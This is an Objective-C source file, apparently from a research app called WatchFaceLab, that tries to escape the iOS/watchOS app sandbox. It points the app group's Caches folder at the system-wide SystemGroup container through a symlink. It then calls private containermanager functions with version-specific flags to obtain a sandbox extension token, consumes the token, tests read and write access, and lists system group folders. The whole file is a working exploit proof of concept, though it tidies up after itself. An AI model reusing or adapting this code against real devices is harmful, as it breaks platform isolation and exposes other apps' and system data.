#include "ContainerTokenProbe.h"

#import <Foundation/Foundation.h>

#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include <xpc/xpc.h>

static NSString *const kProbeAppGroup = @"group.dev.develodom.WatchFaceLab";
static const char *const kProbeTarget =
    "/private/var/containers/Shared/SystemGroup";
static const uint64_t kContainerFlagCandidates[] = {
    UINT64_C(0x0000008000000000), /* 27.x value measured on iOS. */
    UINT64_C(0x0000000800000000), /* 26.x value, tested as a watchOS variant. */
};

typedef void *(*query_create_fn)(void);
typedef void (*query_set_u64_fn)(void *, uint64_t);
typedef void (*query_set_groups_fn)(void *, xpc_object_t);
typedef void *(*query_result_fn)(void *);
typedef void (*query_free_fn)(void *);
typedef char *(*copy_token_fn)(void *);
typedef int64_t (*consume_token_fn)(const char *);
typedef int (*release_token_fn)(int64_t);

static bool
contains_case_insensitive(const char *value, const char *needle)
{
    return strcasestr(value, needle) != NULL;
}

static void
print_bounded_inventory(void)
{
    DIR *directory = opendir(kProbeTarget);
    if (directory == NULL) {
        printf("[container-token] inventory-open errno=%d\n", errno);
        return;
    }

    uint32_t total = 0;
    uint32_t relevant = 0;
    struct dirent *entry = NULL;
    while ((entry = readdir(directory)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }
        total++;
        if (relevant >= 24) {
            continue;
        }
        if (contains_case_insensitive(entry->d_name, "nano") ||
            contains_case_insensitive(entry->d_name, "time") ||
            contains_case_insensitive(entry->d_name, "clock") ||
            contains_case_insensitive(entry->d_name, "face")) {
            printf("[container-token] relevant-system-group=%s\n", entry->d_name);
            relevant++;
        }
    }
    closedir(directory);
    printf("[container-token] inventory-total=%u relevant=%u\n", total, relevant);
}

int32_t
watchfacelab_container_token_probe_run(void)
{
    NSFileManager *file_manager = [NSFileManager defaultManager];
    NSURL *group_root =
        [file_manager containerURLForSecurityApplicationGroupIdentifier:kProbeAppGroup];
    if (group_root == nil) {
        printf("[container-token] result=no-app-group\n");
        return 2;
    }

    NSString *library = [[group_root URLByAppendingPathComponent:@"Library"
                                                     isDirectory:YES] path];
    NSString *caches = [library stringByAppendingPathComponent:@"Caches"];
    NSError *error = nil;
    if (![file_manager createDirectoryAtPath:library
                  withIntermediateDirectories:YES
                                   attributes:nil
                                        error:&error]) {
        printf("[container-token] result=library-create-failed code=%ld\n",
               (long)error.code);
        return 3;
    }

    BOOL is_directory = NO;
    if ([file_manager fileExistsAtPath:caches isDirectory:&is_directory]) {
        if (!is_directory) {
            printf("[container-token] result=caches-not-directory\n");
            return 4;
        }
        NSArray<NSString *> *contents = [file_manager contentsOfDirectoryAtPath:caches
                                                                           error:&error];
        if (contents == nil || contents.count != 0) {
            printf("[container-token] result=caches-not-empty count=%lu code=%ld\n",
                   (unsigned long)contents.count, (long)error.code);
            return 5;
        }
        if (![file_manager removeItemAtPath:caches error:&error]) {
            printf("[container-token] result=caches-remove-failed code=%ld\n",
                   (long)error.code);
            return 6;
        }
    }

    if (![file_manager createSymbolicLinkAtPath:caches
                            withDestinationPath:@(kProbeTarget)
                                          error:&error]) {
        printf("[container-token] result=symlink-failed code=%ld\n", (long)error.code);
        (void)[file_manager createDirectoryAtPath:caches
                       withIntermediateDirectories:NO
                                        attributes:nil
                                             error:nil];
        return 7;
    }

    int32_t result_code = 8;
    int64_t handle = -1;
    xpc_object_t groups = nil;
    void *query = NULL;
    void *query_result = NULL;
    char *token = NULL;
    void *manager = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                           RTLD_NOW | RTLD_LOCAL);
    if (manager == NULL) {
        printf("[container-token] result=containermanager-unavailable\n");
        goto cleanup;
    }

#define LOAD_SYMBOL(name, type) type name = (type)dlsym(manager, #name)
    LOAD_SYMBOL(container_query_create, query_create_fn);
    LOAD_SYMBOL(container_query_set_class, query_set_u64_fn);
    LOAD_SYMBOL(container_query_set_group_identifiers, query_set_groups_fn);
    LOAD_SYMBOL(container_query_operation_set_flags, query_set_u64_fn);
    LOAD_SYMBOL(container_query_operation_set_part, query_set_u64_fn);
    LOAD_SYMBOL(container_query_get_single_result, query_result_fn);
    LOAD_SYMBOL(container_query_free, query_free_fn);
    LOAD_SYMBOL(container_copy_sandbox_token, copy_token_fn);
#undef LOAD_SYMBOL
    consume_token_fn consume_token =
        (consume_token_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    release_token_fn release_token =
        (release_token_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (container_query_create == NULL || container_query_set_class == NULL ||
        container_query_set_group_identifiers == NULL ||
        container_query_operation_set_flags == NULL ||
        container_query_operation_set_part == NULL ||
        container_query_get_single_result == NULL || container_query_free == NULL ||
        container_copy_sandbox_token == NULL || consume_token == NULL) {
        printf("[container-token] result=symbol-missing\n");
        goto close_manager;
    }

    groups = xpc_string_create(kProbeAppGroup.UTF8String);
    for (size_t candidate = 0;
         candidate < sizeof(kContainerFlagCandidates) /
                         sizeof(kContainerFlagCandidates[0]);
         candidate++) {
        query = container_query_create();
        if (query == NULL) {
            printf("[container-token] candidate=%zu result=query-create-failed\n",
                   candidate);
            continue;
        }
        container_query_set_class(query, 7);
        container_query_set_group_identifiers(query, groups);
        container_query_operation_set_part(query, 3);
        container_query_operation_set_flags(query, kContainerFlagCandidates[candidate]);

        query_result = container_query_get_single_result(query);
        token = query_result == NULL ? NULL :
            container_copy_sandbox_token(query_result);
        printf("[container-token] candidate=%zu flags=0x%llx query-result=%d token=%d\n",
               candidate, (unsigned long long)kContainerFlagCandidates[candidate],
               query_result != NULL, token != NULL);
        if (token != NULL) {
            break;
        }
        container_query_free(query);
        query = NULL;
    }
    if (token == NULL || query == NULL) {
        printf("[container-token] result=no-token-all-candidates\n");
        goto close_manager;
    }

    handle = consume_token(token);
    free(token);
    container_query_free(query);
    if (handle < 0) {
        printf("[container-token] result=consume-failed handle=%lld\n",
               (long long)handle);
        goto close_manager;
    }

    printf("[container-token] grant handle=%lld read=%d write=%d\n",
           (long long)handle, access(kProbeTarget, R_OK) == 0,
           access(kProbeTarget, W_OK) == 0);
    print_bounded_inventory();
    result_code = 0;
    if (release_token != NULL) {
        int release_result = release_token(handle);
        printf("[container-token] release=%d\n", release_result);
        handle = -1;
    }

close_manager:
    dlclose(manager);
cleanup:
    if (handle >= 0) {
        release_token_fn late_release =
            (release_token_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
        if (late_release != NULL) {
            (void)late_release(handle);
        }
    }
    if (unlink(caches.fileSystemRepresentation) != 0 && errno != ENOENT) {
        printf("[container-token] cleanup-unlink errno=%d\n", errno);
        return 9;
    }
    error = nil;
    if (![file_manager createDirectoryAtPath:caches
                  withIntermediateDirectories:NO
                                   attributes:nil
                                        error:&error]) {
        printf("[container-token] cleanup-create-failed code=%ld\n",
               (long)error.code);
        return 10;
    }
    printf("[container-token] cleanup=restored result=%d\n", result_code);
    return result_code;
}
